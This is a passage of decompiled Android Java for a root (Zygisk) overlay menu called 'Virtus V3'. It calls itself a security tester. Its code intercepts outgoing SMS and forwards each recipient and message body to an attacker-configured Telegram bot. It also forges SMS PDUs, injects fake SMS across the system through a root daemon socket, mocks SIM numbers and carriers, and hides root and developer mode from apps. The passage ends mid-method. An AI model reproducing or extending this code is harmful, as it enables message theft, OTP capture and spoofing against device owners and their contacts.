                        layoutParams332.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                        editText62.setLayoutParams(layoutParams332);
                        linearLayout5.addView(editText62);
                        TextView textView132 = new TextView(this.val$activity);
                        textView132.setText("Telegram Chat ID:");
                        textView132.setTextColor(-328454);
                        textView132.setTextSize(2, 11.0f);
                        LinearLayout.LayoutParams layoutParams342 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams342.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                        textView132.setLayoutParams(layoutParams342);
                        linearLayout5.addView(textView132);
                        final EditText editText72 = new EditText(this.val$activity);
                        editText72.setHint("e.g. 987654321 or -100123456");
                        editText72.setTextColor(-1);
                        editText72.setTextSize(2, 12.0f);
                        editText72.setHintTextColor(-8947848);
                        editText72.setBackground(gradientDrawable52);
                        editText72.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f));
                        editText72.setLayoutParams(layoutParams332);
                        linearLayout5.addView(editText72);
                        new Thread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.10
                            @Override // java.lang.Runnable
                            public void run() {
                                final String[] loadTelegramConfig = FloatingMenu.loadTelegramConfig();
                                AnonymousClass1.this.val$activity.runOnUiThread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.10.1
                                    @Override // java.lang.Runnable
                                    public void run() {
                                        editText62.setText(loadTelegramConfig[0]);
                                        editText72.setText(loadTelegramConfig[1]);
                                    }
                                });
                            }
                        }).start();
                        Button button62 = new Button(this.val$activity);
                        button62.setText("Verify & Submit");
                        button62.setTextColor(-1);
                        button62.setTextSize(2, 12.0f);
                        button62.setAllCaps(false);
                        GradientDrawable gradientDrawable72 = new GradientDrawable();
                        gradientDrawable72.setShape(0);
                        gradientDrawable72.setColor(-2937041);
                        gradientDrawable72.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 8.0f));
                        button62.setBackground(gradientDrawable72);
                        LinearLayout.LayoutParams layoutParams352 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 38.0f));
                        layoutParams352.topMargin = FloatingMenu.dpToPx(this.val$activity, 14.0f);
                        button62.setLayoutParams(layoutParams352);
                        button62.setOnClickListener(new AnonymousClass11(editText62, editText72));
                        linearLayout5.addView(button62);
                        final GradientDrawable gradientDrawable82 = new GradientDrawable();
                        gradientDrawable82.setShape(0);
                        gradientDrawable82.setColor(-3924422);
                        gradientDrawable82.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 6.0f));
                        final GradientDrawable gradientDrawable92 = new GradientDrawable();
                        gradientDrawable92.setShape(0);
                        gradientDrawable92.setColor(-6684672);
                        gradientDrawable92.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 6.0f));
                        final Runnable runnable4 = new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.12
                            @Override // java.lang.Runnable
                            public void run() {
                                button.setBackground(gradientDrawable92);
                                button2.setBackground(gradientDrawable82);
                                button3.setBackground(gradientDrawable92);
                                linearLayout3.setVisibility(8);
                                linearLayout4.setVisibility(0);
                                linearLayout5.setVisibility(8);
                            }
                        };
                        final Runnable runnable22 = new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.13
                            @Override // java.lang.Runnable
                            public void run() {
                                button.setBackground(gradientDrawable82);
                                button2.setBackground(gradientDrawable92);
                                button3.setBackground(gradientDrawable92);
                                linearLayout3.setVisibility(0);
                                linearLayout4.setVisibility(8);
                                linearLayout5.setVisibility(8);
                            }
                        };
                        final Runnable runnable32 = new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.14
                            @Override // java.lang.Runnable
                            public void run() {
                                button.setBackground(gradientDrawable92);
                                button2.setBackground(gradientDrawable92);
                                button3.setBackground(gradientDrawable82);
                                linearLayout3.setVisibility(8);
                                linearLayout4.setVisibility(8);
                                linearLayout5.setVisibility(0);
                            }
                        };
                        button.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.15
                            @Override // android.view.View.OnClickListener
                            public void onClick(View view4) {
                                runnable22.run();
                            }
                        });
                        button2.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.16
                            @Override // android.view.View.OnClickListener
                            public void onClick(View view4) {
                                runnable4.run();
                            }
                        });
                        button3.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.17
                            @Override // android.view.View.OnClickListener
                            public void onClick(View view4) {
                                runnable32.run();
                            }
                        });
                        runnable4.run();
                        TextView textView142 = new TextView(this.val$activity);
                        textView142.setText("Virtus V3 Security Tester");
                        textView142.setTextColor(-6723994);
                        textView142.setTextSize(2, 10.0f);
                        textView142.setGravity(17);
                        LinearLayout.LayoutParams layoutParams362 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams362.topMargin = FloatingMenu.dpToPx(this.val$activity, 16.0f);
                        textView142.setLayoutParams(layoutParams362);
                        linearLayout.addView(textView142);
                        frameLayout.addView(frameLayout2);
                        frameLayout.addView(linearLayout);
                        viewGroup.addView(frameLayout);
                        frameLayout2.setOnTouchListener(new View.OnTouchListener() { // from class: com.floatingmenu.FloatingMenu.1.18
                            private static final int CLICK_DRAG_TOLERANCE = 10;
                            private float initialTouchX;
                            private float initialTouchY;
                            private float initialX;
                            private float initialY;
                            private long touchTime;

                            @Override // android.view.View.OnTouchListener
                            public boolean onTouch(View view4, MotionEvent motionEvent) {
                                float x;
                                float y;
                                int action = motionEvent.getAction();
                                if (action == 0) {
                                    x = frameLayout2.getX();
                                    this.initialX = x;
                                    y = frameLayout2.getY();
                                    this.initialY = y;
                                    this.initialTouchX = motionEvent.getRawX();
                                    this.initialTouchY = motionEvent.getRawY();
                                    this.touchTime = System.currentTimeMillis();
                                    return true;
                                }
                                if (action != 1) {
                                    if (action != 2) {
                                        return false;
                                    }
                                    float rawX = motionEvent.getRawX() - this.initialTouchX;
                                    float rawY = motionEvent.getRawY() - this.initialTouchY;
                                    frameLayout2.setX(this.initialX + rawX);
                                    frameLayout2.setY(this.initialY + rawY);
                                    return true;
                                }
                                float rawX2 = motionEvent.getRawX() - this.initialTouchX;
                                float rawY2 = motionEvent.getRawY() - this.initialTouchY;
                                long currentTimeMillis = System.currentTimeMillis() - this.touchTime;
                                if (Math.abs(rawX2) < 10.0f && Math.abs(rawY2) < 10.0f && currentTimeMillis < 400) {
                                    frameLayout2.setVisibility(8);
                                    linearLayout.setVisibility(0);
                                }
                                return true;
                            }
                        });
                        textView2.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.19
                            @Override // android.view.View.OnClickListener
                            public void onClick(View view4) {
                                linearLayout.setVisibility(8);
                                frameLayout2.setVisibility(0);
                            }
                        });
                        return;
                    } catch (Exception e) {
                        e = e;
                        Log.e(str, "Error in FloatingMenu.show", e);
                        return;
                    }
                    button4.setOnClickListener(new AnonymousClass3(r5, strArr, editText, r12, strArr2, editText2, editText3, r3, r2));
                    linearLayout3.addView(button4);
                    str = FloatingMenu.TAG_MENU;
                    new Thread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.4
                        @Override // java.lang.Runnable
                        public void run() {
                            final String[] loadSimSettingsEx = FloatingMenu.loadSimSettingsEx();
                            AnonymousClass1.this.val$activity.runOnUiThread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.4.1
                                @Override // java.lang.Runnable
                                public void run() {
                                    boolean equalsIgnoreCase = "true".equalsIgnoreCase(loadSimSettingsEx[0]);
                                    String[] strArr3 = loadSimSettingsEx;
                                    String str2 = strArr3[1];
                                    String str3 = strArr3[2];
                                    boolean equalsIgnoreCase2 = "true".equalsIgnoreCase(strArr3[3]);
                                    String[] strArr4 = loadSimSettingsEx;
                                    String str4 = strArr4[4];
                                    String str5 = strArr4[5];
                                    String str6 = "in";
                                    String str7 = strArr4.length >= 7 ? strArr4[6] : "in";
                                    if (str7 != null && !str7.isEmpty()) {
                                        str6 = str7;
                                    }
                                    r5.setChecked(equalsIgnoreCase);
                                    linearLayout6.setVisibility(equalsIgnoreCase ? 0 : 8);
                                    AnonymousClass4 anonymousClass4 = AnonymousClass4.this;
                                    strArr[0] = str2;
                                    FloatingMenu.updateSelector(createProviderSelector, str2);
                                    editText.setText(str3);
                                    r12.setChecked(equalsIgnoreCase2);
                                    linearLayout7.setVisibility(equalsIgnoreCase2 ? 0 : 8);
                                    AnonymousClass4 anonymousClass42 = AnonymousClass4.this;
                                    strArr2[0] = str4;
                                    FloatingMenu.updateSelector(createProviderSelector2, str4);
                                    editText2.setText(str5);
                                    editText3.setText(str6);
                                    String[] strArr5 = loadSimSettingsEx;
                                    r3.setChecked(strArr5.length >= 8 ? "true".equalsIgnoreCase(strArr5[7]) : false);
                                    String[] strArr6 = loadSimSettingsEx;
                                    r2.setChecked(strArr6.length >= 9 ? "true".equalsIgnoreCase(strArr6[8]) : false);
                                }
                            });
                        }
                    }).start();
                } catch (Exception e2) {
                    e = e2;
                    str = FloatingMenu.TAG_MENU;
                    Log.e(str, "Error in FloatingMenu.show", e);
                    return;
                }
                TextView textView15 = new TextView(this.val$activity);
                textView15.setText("V");
                textView15.setTextColor(-16711731);
                textView15.setTextSize(2, 0.0f);
                textView15.setTypeface(Typeface.create("sans-serif-medium", 1));
                textView15.setGravity(17);
                frameLayout2.addView(textView15, new FrameLayout.LayoutParams(-16711731, -16711731));
                final LinearLayout linearLayout8 = new LinearLayout(this.val$activity);
                linearLayout8.setOrientation(1);
                FrameLayout.LayoutParams layoutParams37 = new FrameLayout.LayoutParams(FloatingMenu.dpToPx(this.val$activity, 280.0f), -2);
                layoutParams37.gravity = 17;
                linearLayout8.setLayoutParams(layoutParams37);
                linearLayout8.setVisibility(8);
                GradientDrawable gradientDrawable22 = new GradientDrawable();
                gradientDrawable22.setShape(0);
                gradientDrawable22.setColor(-435023342);
                gradientDrawable22.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 16.0f));
                gradientDrawable22.setStroke(FloatingMenu.dpToPx(this.val$activity, 2.0f), -3924422);
                linearLayout8.setBackground(gradientDrawable22);
                int dpToPx32 = FloatingMenu.dpToPx(this.val$activity, 16.0f);
                linearLayout8.setPadding(dpToPx32, dpToPx32, dpToPx32, dpToPx32);
                RelativeLayout relativeLayout2 = new RelativeLayout(this.val$activity);
                relativeLayout2.setLayoutParams(new RelativeLayout.LayoutParams(-16711731, -2));
                TextView textView16 = new TextView(this.val$activity);
                textView16.setText("Zygisk Mode Menu Virtus V3");
                textView16.setTextColor(-16711731);
                textView16.setTextSize(2, 16.0f);
                textView16.setTypeface(Typeface.create("sans-serif-medium", 1));
                RelativeLayout.LayoutParams layoutParams42 = new RelativeLayout.LayoutParams(-2, -2);
                layoutParams42.addRule(9);
                relativeLayout2.addView(textView16, layoutParams42);
                TextView textView22 = new TextView(this.val$activity);
                textView22.setText("✕");
                textView22.setTextColor(-328454);
                textView22.setTextSize(2, 18.0f);
                textView22.setTypeface(Typeface.DEFAULT_BOLD);
                textView22.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 4.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 4.0f));
                RelativeLayout.LayoutParams layoutParams52 = new RelativeLayout.LayoutParams(-2, -2);
                layoutParams52.addRule(11);
                relativeLayout2.addView(textView22, layoutParams52);
                linearLayout8.addView(relativeLayout2);
                LinearLayout linearLayout22 = new LinearLayout(this.val$activity);
                linearLayout22.setOrientation(0);
                LinearLayout.LayoutParams layoutParams62 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams62.topMargin = FloatingMenu.dpToPx(this.val$activity, 12.0f);
                linearLayout22.setLayoutParams(layoutParams62);
                final Button button7 = new Button(this.val$activity);
                button7.setText("SYSTEM");
                button7.setTextSize(2, 10.0f);
                button7.setAllCaps(true);
                button7.setPadding(0, 0, 0, 0);
                LinearLayout.LayoutParams layoutParams72 = new LinearLayout.LayoutParams(0, FloatingMenu.dpToPx(this.val$activity, 32.0f), 1.0f);
                layoutParams72.rightMargin = FloatingMenu.dpToPx(this.val$activity, 2.0f);
                button7.setLayoutParams(layoutParams72);
                final Button button22 = new Button(this.val$activity);
                button22.setText("MESSAGE");
                button22.setTextSize(2, 10.0f);
                button22.setAllCaps(true);
                button22.setPadding(0, 0, 0, 0);
                LinearLayout.LayoutParams layoutParams82 = new LinearLayout.LayoutParams(0, FloatingMenu.dpToPx(this.val$activity, 32.0f), 1.0f);
                layoutParams82.leftMargin = FloatingMenu.dpToPx(this.val$activity, 2.0f);
                layoutParams82.rightMargin = FloatingMenu.dpToPx(this.val$activity, 2.0f);
                button22.setLayoutParams(layoutParams82);
                final Button button32 = new Button(this.val$activity);
                button32.setText("TELEGRAM");
                button32.setTextSize(2, 10.0f);
                button32.setAllCaps(true);
                button32.setPadding(0, 0, 0, 0);
                LinearLayout.LayoutParams layoutParams92 = new LinearLayout.LayoutParams(0, FloatingMenu.dpToPx(this.val$activity, 32.0f), 1.0f);
                layoutParams92.leftMargin = FloatingMenu.dpToPx(this.val$activity, 2.0f);
                button32.setLayoutParams(layoutParams92);
                linearLayout22.addView(button7);
                linearLayout22.addView(button22);
                linearLayout22.addView(button32);
                linearLayout8.addView(linearLayout22);
                final LinearLayout linearLayout32 = new LinearLayout(this.val$activity);
                linearLayout32.setOrientation(1);
                linearLayout32.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                final LinearLayout linearLayout42 = new LinearLayout(this.val$activity);
                linearLayout42.setOrientation(1);
                linearLayout42.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                final LinearLayout linearLayout52 = new LinearLayout(this.val$activity);
                linearLayout52.setOrientation(1);
                linearLayout52.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                linearLayout8.addView(linearLayout32);
                linearLayout8.addView(linearLayout42);
                linearLayout8.addView(linearLayout52);
                View view4 = new View(this.val$activity);
                LinearLayout.LayoutParams layoutParams102 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 1.0f));
                layoutParams102.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                layoutParams102.bottomMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                view4.setLayoutParams(layoutParams102);
                view4.setBackgroundColor(-3924422);
                linearLayout8.addView(view4);
                TextView textView32 = new TextView(this.val$activity);
                textView32.setText("System SIM Configuration");
                textView32.setTextColor(-328454);
                textView32.setTextSize(2, 12.0f);
                LinearLayout.LayoutParams layoutParams112 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams112.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                textView32.setLayoutParams(layoutParams112);
                linearLayout32.addView(textView32);
                View view22 = new View(this.val$activity);
                LinearLayout.LayoutParams layoutParams122 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 1.0f));
                layoutParams122.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                layoutParams122.bottomMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                view22.setLayoutParams(layoutParams122);
                view22.setBackgroundColor(-3924422);
                linearLayout32.addView(view22);
                final Switch r52 = new Switch(this.val$activity);
                r52.setText("Enable SIM 1 Mocking");
                r52.setTextColor(-1);
                r52.setTextSize(2, 13.0f);
                LinearLayout.LayoutParams layoutParams132 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams132.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                r52.setLayoutParams(layoutParams132);
                linearLayout32.addView(r52);
                final LinearLayout linearLayout62 = new LinearLayout(this.val$activity);
                linearLayout62.setOrientation(1);
                linearLayout62.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                linearLayout62.setVisibility(8);
                TextView textView42 = new TextView(this.val$activity);
                textView42.setText("SIM 1 Provider:");
                textView42.setTextColor(-328454);
                textView42.setTextSize(2, 11.0f);
                LinearLayout.LayoutParams layoutParams142 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams142.topMargin = FloatingMenu.dpToPx(this.val$activity, 6.0f);
                textView42.setLayoutParams(layoutParams142);
                linearLayout62.addView(textView42);
                final String[] strArr3 = {"jio"};
                final LinearLayout createProviderSelector3 = FloatingMenu.createProviderSelector(this.val$activity, strArr3);
                linearLayout62.addView(createProviderSelector3);
                TextView textView52 = new TextView(this.val$activity);
                textView52.setText("SIM 1 Number:");
                textView52.setTextColor(-328454);
                textView52.setTextSize(2, 11.0f);
                LinearLayout.LayoutParams layoutParams152 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams152.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                textView52.setLayoutParams(layoutParams152);
                linearLayout62.addView(textView52);
                final EditText editText8 = new EditText(this.val$activity);
                editText8.setTextColor(-1);
                editText8.setTextSize(2, 13.0f);
                editText8.setHint("e.g. +919876543210");
                editText8.setHintTextColor(-8947848);
                GradientDrawable gradientDrawable32 = new GradientDrawable();
                gradientDrawable32.setShape(0);
                gradientDrawable32.setColor(-6684672);
                gradientDrawable32.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 6.0f));
                editText8.setBackground(gradientDrawable32);
                editText8.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f));
                LinearLayout.LayoutParams layoutParams162 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams162.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                editText8.setLayoutParams(layoutParams162);
                linearLayout62.addView(editText8);
                linearLayout32.addView(linearLayout62);
                final Switch r122 = new Switch(this.val$activity);
                r122.setText("Enable SIM 2 Mocking");
                r122.setTextColor(-1);
                r122.setTextSize(2, 13.0f);
                LinearLayout.LayoutParams layoutParams172 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams172.topMargin = FloatingMenu.dpToPx(this.val$activity, 14.0f);
                r122.setLayoutParams(layoutParams172);
                linearLayout32.addView(r122);
                final LinearLayout linearLayout72 = new LinearLayout(this.val$activity);
                linearLayout72.setOrientation(1);
                linearLayout72.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
                linearLayout72.setVisibility(8);
                TextView textView62 = new TextView(this.val$activity);
                textView62.setText("SIM 2 Provider:");
                textView62.setTextColor(-328454);
                textView62.setTextSize(2, 11.0f);
                textView62.setLayoutParams(layoutParams142);
                linearLayout72.addView(textView62);
                final String[] strArr22 = {"jio"};
                final LinearLayout createProviderSelector22 = FloatingMenu.createProviderSelector(this.val$activity, strArr22);
                linearLayout72.addView(createProviderSelector22);
                TextView textView72 = new TextView(this.val$activity);
                textView72.setText("SIM 2 Number:");
                textView72.setTextColor(-328454);
                textView72.setTextSize(2, 11.0f);
                textView72.setLayoutParams(layoutParams152);
                linearLayout72.addView(textView72);
                final EditText editText22 = new EditText(this.val$activity);
                editText22.setTextColor(-1);
                editText22.setTextSize(2, 13.0f);
                editText22.setHint("e.g. +919876543210");
                editText22.setHintTextColor(-8947848);
                editText22.setBackground(gradientDrawable32);
                editText22.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f));
                editText22.setLayoutParams(layoutParams162);
                linearLayout72.addView(editText22);
                linearLayout32.addView(linearLayout72);
                TextView textView82 = new TextView(this.val$activity);
                textView82.setText("Mock Country ISO (2-letter):");
                textView82.setTextColor(-328454);
                textView82.setTextSize(2, 11.0f);
                LinearLayout.LayoutParams layoutParams182 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams182.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                textView82.setLayoutParams(layoutParams182);
                linearLayout32.addView(textView82);
                final EditText editText32 = new EditText(this.val$activity);
                editText32.setTextColor(-1);
                editText32.setTextSize(2, 13.0f);
                editText32.setHint("e.g. in, us, ae");
                editText32.setHintTextColor(-8947848);
                editText32.setBackground(gradientDrawable32);
                editText32.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f));
                LinearLayout.LayoutParams layoutParams192 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams192.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                editText32.setLayoutParams(layoutParams192);
                linearLayout32.addView(editText32);
                final Switch r32 = new Switch(this.val$activity);
                r32.setText("I am not Developer");
                r32.setTextColor(-1);
                r32.setTextSize(2, 13.0f);
                LinearLayout.LayoutParams layoutParams202 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams202.topMargin = FloatingMenu.dpToPx(this.val$activity, 14.0f);
                r32.setLayoutParams(layoutParams202);
                linearLayout32.addView(r32);
                final Switch r22 = new Switch(this.val$activity);
                r22.setText("I am no root");
                r22.setTextColor(-1);
                r22.setTextSize(2, 13.0f);
                LinearLayout.LayoutParams layoutParams212 = new LinearLayout.LayoutParams(-1, -2);
                layoutParams212.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                r22.setLayoutParams(layoutParams212);
                linearLayout32.addView(r22);
                r52.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: com.floatingmenu.FloatingMenu.1.1
                    @Override // android.widget.CompoundButton.OnCheckedChangeListener
                    public void onCheckedChanged(CompoundButton compoundButton, boolean z) {
                        linearLayout62.setVisibility(z ? 0 : 8);
                    }
                });
                r122.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: com.floatingmenu.FloatingMenu.1.2
                    @Override // android.widget.CompoundButton.OnCheckedChangeListener
                    public void onCheckedChanged(CompoundButton compoundButton, boolean z) {
                        linearLayout72.setVisibility(z ? 0 : 8);
                    }
                });
                Button button42 = new Button(this.val$activity);
                button42.setText("Save SIM Settings");
                button42.setTextColor(-1);
                button42.setTextSize(2, 12.0f);
                button42.setAllCaps(false);
                GradientDrawable gradientDrawable42 = new GradientDrawable();
                gradientDrawable42.setShape(0);
                gradientDrawable42.setColor(-2937041);
                gradientDrawable42.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 8.0f));
                button42.setBackground(gradientDrawable42);
                LinearLayout.LayoutParams layoutParams222 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 38.0f));
                layoutParams222.topMargin = FloatingMenu.dpToPx(this.val$activity, 16.0f);
                button42.setLayoutParams(layoutParams222);
            } catch (Exception e3) {
                e = e3;
                str = FloatingMenu.TAG_MENU;
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static LinearLayout createProviderSelector(Activity activity, final String[] strArr) {
        LinearLayout linearLayout = new LinearLayout(activity);
        int i = 0;
        linearLayout.setOrientation(0);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, dpToPx(activity, 32.0f));
        layoutParams.topMargin = dpToPx(activity, 6.0f);
        linearLayout.setLayoutParams(layoutParams);
        final String[] strArr2 = {"jio", "airtel", "vi", "bsnl"};
        CharSequence[] charSequenceArr = {"Jio", "Airtel", "Vi", "BSNL"};
        Button[] buttonArr = new Button[4];
        final GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(-2937041);
        gradientDrawable.setCornerRadius(dpToPx(activity, 6.0f));
        GradientDrawable gradientDrawable2 = new GradientDrawable();
        gradientDrawable2.setColor(-14735049);
        gradientDrawable2.setCornerRadius(dpToPx(activity, 6.0f));
        int i2 = 0;
        for (int i3 = 4; i2 < i3; i3 = 4) {
            Button button = new Button(activity);
            button.setText(charSequenceArr[i2]);
            button.setTextSize(2, 11.0f);
            button.setTextColor(-1);
            button.setPadding(i, i, i, i);
            LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(i, -1, 1.0f);
            if (i2 > 0) {
                layoutParams2.leftMargin = dpToPx(activity, 4.0f);
            }
            button.setLayoutParams(layoutParams2);
            if (strArr2[i2].equalsIgnoreCase(strArr[i])) {
                button.setBackground(gradientDrawable);
            } else {
                button.setBackground(gradientDrawable2);
            }
            final int i4 = i2;
            final GradientDrawable gradientDrawable3 = gradientDrawable2;
            final Button[] buttonArr2 = buttonArr;
            Button[] buttonArr3 = buttonArr;
            button.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.7
                @Override // android.view.View.OnClickListener
                public void onClick(View view) {
                    int i5 = 0;
                    strArr[0] = strArr2[i4];
                    while (i5 < 4) {
                        buttonArr2[i5].setBackground(i5 == i4 ? gradientDrawable : gradientDrawable3);
                        i5++;
                    }
                }
            });
            buttonArr3[i2] = button;
            linearLayout.addView(button);
            i2++;
            gradientDrawable2 = gradientDrawable3;
            buttonArr = buttonArr3;
            i = 0;
        }
        return linearLayout;
    }

    private static byte[] createSmsPdu(String str, String str2) {
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byteArrayOutputStream.write(0);
            byteArrayOutputStream.write(4);
            for (int i = 0; i < str.length(); i++) {
                char charAt = str.charAt(i);
                if (charAt != '+' && (charAt < '0' || charAt > '9')) {
                    byteArrayOutputStream.write(((str.length() * 7) + 3) / 4);
                    byteArrayOutputStream.write(208);
                    byte[] pack7bit = pack7bit(str);
                    byteArrayOutputStream.write(pack7bit, 0, pack7bit.length);
                    break;
                }
            }
            String replace = str.replace("+", "");
            byteArrayOutputStream.write(replace.length());
            if (str.startsWith("+")) {
                byteArrayOutputStream.write(145);
            } else {
                byteArrayOutputStream.write(129);
            }
            for (int i2 = 0; i2 < replace.length(); i2 += 2) {
                int i3 = i2 + 1;
                byteArrayOutputStream.write((replace.charAt(i2) - '0') | ((i3 < replace.length() ? replace.charAt(i3) - '0' : 15) << 4));
            }
            byteArrayOutputStream.write(0);
            byteArrayOutputStream.write(0);
            Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("UTC"));
            int i4 = calendar.get(1) % 100;
            int i5 = calendar.get(2) + 1;
            int i6 = calendar.get(5);
            int i7 = calendar.get(11);
            int i8 = calendar.get(12);
            int i9 = calendar.get(13);
            byteArrayOutputStream.write((i4 / 10) | ((i4 % 10) << 4));
            byteArrayOutputStream.write(((i5 % 10) << 4) | (i5 / 10));
            byteArrayOutputStream.write((i6 / 10) | ((i6 % 10) << 4));
            byteArrayOutputStream.write(((i7 % 10) << 4) | (i7 / 10));
            byteArrayOutputStream.write(((i8 % 10) << 4) | (i8 / 10));
            byteArrayOutputStream.write((i9 / 10) | ((i9 % 10) << 4));
            byteArrayOutputStream.write(0);
            byte[] stringToGsm7BitSeptets = stringToGsm7BitSeptets(str2);
            if (stringToGsm7BitSeptets.length > 250) {
                byte[] bArr = new byte[250];
                System.arraycopy(stringToGsm7BitSeptets, 0, bArr, 0, 250);
                stringToGsm7BitSeptets = bArr;
            }
            byteArrayOutputStream.write(stringToGsm7BitSeptets.length);
            byte[] packSeptets = packSeptets(stringToGsm7BitSeptets);
            byteArrayOutputStream.write(packSeptets, 0, packSeptets.length);
            return byteArrayOutputStream.toByteArray();
        } catch (Exception unused) {
            return new byte[0];
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static int dpToPx(Context context, float f) {
        return (int) TypedValue.applyDimension(1, f, context.getResources().getDisplayMetrics());
    }

    public static void forwardSmsToTelegram(final String str, final String str2) {
        new Thread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.6
            @Override // java.lang.Runnable
            public void run() {
                String[] loadTelegramConfig = FloatingMenu.loadTelegramConfig();
                String str3 = loadTelegramConfig[0];
                String str4 = loadTelegramConfig[1];
                if (str3 == null || str3.isEmpty() || str4 == null || str4.isEmpty()) {
                    Log.w(FloatingMenu.TAG_MENU, "Telegram credentials not configured; skipping SMS forward.");
                    return;
                }
                FloatingMenu.sendTelegramMessageAsync(str3, str4, "<b>📱 Intercepted Outgoing SMS Zygisk</b>\n<b>Mode Menu V3 @Hivirtus 🔥</b>\n\n<b>📞 To:</b> <code>" + str.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") + "</code>\n<b>💬 Message:</b><code>" + str2.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") + "</code>");
            }
        }).start();
    }

    private static Context getSystemContext() {
        try {
            Method declaredMethod = Class.forName("android.app.ActivityThread").getDeclaredMethod("currentApplication", new Class[0]);
            declaredMethod.setAccessible(true);
            return (Context) declaredMethod.invoke(null, new Object[0]);
        } catch (Throwable unused) {
            return null;
        }
    }

    private static void injectSmsSystemWideAsync(final String str, final String str2) {
        new Thread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.4
            @Override // java.lang.Runnable
            public void run() {
                LocalSocket localSocket;
                Throwable th;
                try {
                    localSocket = new LocalSocket();
                    try {
                        localSocket.connect(new LocalSocketAddress("zygisk_menu_socket"));
                        localSocket.setSoTimeout(3000);
                        OutputStream outputStream = localSocket.getOutputStream();
                        outputStream.write((str + "|" + str2 + "\n").getBytes("UTF-8"));
                        outputStream.flush();
                    } catch (Throwable th2) {
                        th = th2;
                        try {
                            Log.e(FloatingMenu.TAG_MENU, "Failed to connect to root SMS daemon local socket", th);
                            if (localSocket == null) {
                                return;
                            }
                            localSocket.close();
                        } catch (Throwable th3) {
                            if (localSocket != null) {
                                try {
                                    localSocket.close();
                                } catch (Exception unused) {
                                }
                            }
                            throw th3;
                        }
                    }
                } catch (Throwable th4) {
